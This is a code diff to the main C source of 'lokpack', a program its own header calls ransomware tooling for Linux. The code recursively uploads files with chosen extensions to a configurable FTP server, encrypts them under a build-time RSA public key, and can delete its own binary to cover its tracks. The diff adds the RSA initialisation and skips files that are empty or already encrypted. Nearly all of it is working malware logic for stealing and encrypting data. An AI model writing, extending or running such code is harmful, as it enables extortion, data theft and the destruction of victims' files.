@@ -1,6 +1,8 @@
+// clang-format off
+
 /*
 
- * lokpack | Ransomware tooling for x84_64 Linux 
+ * lokpack | Ransomware tooling for x84_64 Linux
  * Written by ngn (https://ngn.tf) (2024)
 
  * This program is free software: you can redistribute it and/or modify
@@ -18,6 +20,8 @@
 
 */
 
+// clang-format on
+
 #include <curl/curl.h>
 #include <dirent.h>
 #include <stdlib.h>
@@ -25,8 +29,8 @@
 #include <sys/stat.h>
 #include <unistd.h>
 
-#include "../lib/enc.h"
 #include "../lib/log.h"
+#include "../lib/rsa.h"
 #include "../lib/util.h"
 #include "op.h"
 #include "pool.h"
@@ -38,7 +42,7 @@ void upload_files(char *path, clist_t *exts, threadpool pool) {
     return;
 
   struct dirent *ent;
-  char fp[PATH_MAX];
+  char           fp[PATH_MAX];
 
   while ((ent = readdir(dir)) != NULL) {
     if (eq(ent->d_name, "."))
@@ -57,9 +61,10 @@ void upload_files(char *path, clist_t *exts, threadpool pool) {
     if ((st.st_mode & S_IFMT) == S_IFDIR) {
       debug("Uploading directory: %s...", fp);
       upload_files(strdup(fp), exts, pool);
+      continue;
     }
 
-    if (has_valid_ext(fp, exts)) {
+    if (has_valid_exts(fp, exts)) {
       debug("Uploading file: %s...", fp);
       thpool_add_work(pool, upload_file, strdup(fp));
     }
@@ -76,7 +81,7 @@ void encrypt_files(char *path, clist_t *exts, threadpool pool) {
     return;
 
   struct dirent *ent;
-  char fp[PATH_MAX];
+  char           fp[PATH_MAX];
 
   while ((ent = readdir(dir)) != NULL) {
     if (eq(ent->d_name, "."))
@@ -85,13 +90,13 @@ void encrypt_files(char *path, clist_t *exts, threadpool pool) {
       continue;
 
     join(fp, path, ent->d_name);
-    if (access(fp, R_OK & W_OK) < 0){
+    if (access(fp, R_OK & W_OK) < 0) {
       debug("Skipping because access check failed: %s", fp);
       continue;
     }
 
     struct stat st;
-    if (stat(fp, &st) < 0){
+    if (stat(fp, &st) < 0) {
       debug("Skipping because stat failed: %s", fp);
       continue;
     }
@@ -99,9 +104,16 @@ void encrypt_files(char *path, clist_t *exts, threadpool pool) {
     if ((st.st_mode & S_IFMT) == S_IFDIR) {
       debug("Encrypting directory: %s...", fp);
       encrypt_files(strdup(fp), exts, pool);
+      continue;
     }
 
-    if (has_valid_ext(fp, exts)) {
+    if (st.st_size <= 0)
+      continue;
+
+    if (endswith(fp, EXT))
+      continue;
+
+    if (has_valid_exts(fp, exts)) {
       debug("Encrypting file: %s...", fp);
       thpool_add_work(pool, encrypt_file, strdup(fp));
     }
@@ -120,8 +132,7 @@ int main(int argc, char **argv) {
       return EXIT_FAILURE;
   }
 
-  info("Running v" VERSION
-       ", make sure you are on the latest version before reporting issues");
+  info("Running v" VERSION ", make sure you are on the latest version before reporting issues");
   info("Running with following options:");
   print_opts();
 
@@ -130,18 +141,18 @@ int main(int argc, char **argv) {
     return ret;
   }
 
-  threadpool pool = thpool_init(get_int("threads"));
-  clist_t *paths = clist_from_str(get_str("paths"));
-  clist_t *exts = clist_from_str(get_str("exts"));
+  threadpool pool  = thpool_init(get_int("threads"));
+  clist_t   *paths = clist_from_str(get_str("paths"));
+  clist_t   *exts  = clist_from_str(get_str("exts"));
 
   if (paths->s <= 0) {
     error("Please specify at least one directory");
     goto DONE;
   }
 
-  DEBUG = get_bool("debug");
-  EXT = malloc(8);
-  char *sum = get_md5(BUILD_KEY);
+  DEBUG     = get_bool("debug");
+  EXT       = malloc(8);
+  char *sum = get_md5(BUILD_PUB);
   snprintf(EXT, 8, "%.5s", sum);
 
   if (get_bool("no-ftp"))
@@ -154,10 +165,10 @@ int main(int argc, char **argv) {
   }
 
   FTP_USER = get_str("ftp-user");
-  FTP_PWD = get_str("ftp-pwd");
-  FTP_URL = get_str("ftp-url");
-  
-  if(get_bool("destruct"))
+  FTP_PWD  = get_str("ftp-pwd");
+  FTP_URL  = get_str("ftp-url");
+
+  if (get_bool("destruct"))
     unlink(argv[0]);
 
   for (int i = 0; i < paths->s; i++) {
@@ -172,8 +183,13 @@ int main(int argc, char **argv) {
   }
 
 ENCRYPT:
-  if(get_bool("destruct"))
+  if (get_bool("destruct"))
     unlink(argv[0]);
+
+  if (!rsa_init(BUILD_PUB, true)) {
+    error("Failed to init RSA key");
+    goto DONE;
+  }
 
   for (int i = 0; i < paths->s; i++) {
     char *cur = paths->c[i];
@@ -187,9 +203,13 @@ ENCRYPT:
   }
 
   success("Completed, cleaning up");
+
 DONE:
   clist_free(exts);
   clist_free(paths);
+
   thpool_destroy(pool);
+
+  rsa_free();
   return ret;
 }
